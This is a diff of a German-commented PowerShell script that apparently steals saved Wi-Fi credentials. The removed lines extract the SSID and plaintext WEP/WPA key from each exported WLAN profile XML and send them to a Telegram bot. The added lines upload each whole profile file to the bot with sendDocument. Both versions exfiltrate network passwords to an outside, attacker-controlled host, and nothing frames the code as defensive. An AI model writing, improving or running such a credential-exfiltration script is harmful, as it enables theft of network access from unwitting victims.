@@ -28,28 +28,13 @@ if ($xmlFiles.Count -eq 0) {
 
 # Webhook-Anfrage mit Datei-Upload
 foreach ($xmlFile in $xmlFiles) {
-    $xml = [xml](Get-Content -Path $xmlFile.FullName)
-    $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
-    $password = ""
-
-    if ($xml.WLANProfile.WEP) {
-        $password = $xml.WLANProfile.WEP.keyMaterial
-    } elseif ($xml.WLANProfile.WPA) {
-        $password = $xml.WLANProfile.WPA.keyMaterial
-    } elseif ($xml.WLANProfile.WPA2) {
-        $password = $xml.WLANProfile.WPA2.keyMaterial
-    } elseif ($xml.WLANProfile.WPA3) {
-        $password = $xml.WLANProfile.WPA3.keyMaterial
-    }
-
-    # Bereite die Daten vor
-    $message = "SSID: $ssid`nPassword: $password"
-    $encodedMessage = [Uri]::EscapeDataString($message)
-    $uri = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encodedMessage"
+    $uri = "https://api.telegram.org/bot$botToken/sendDocument?chat_id=$chatId"
 
     try {
         # Senden Sie die Anfrage
-        $response = Invoke-RestMethod -Uri $uri -Method Get
+        $response = Invoke-RestMethod -Uri $uri -Method Post -Form @{
+            document = Get-Item $xmlFile.FullName
+        }
         if ($response.ok) {
             Write-Host "Erfolgreich an den Telegram-Bot gesendet: $($xmlFile.Name)"
         } else {
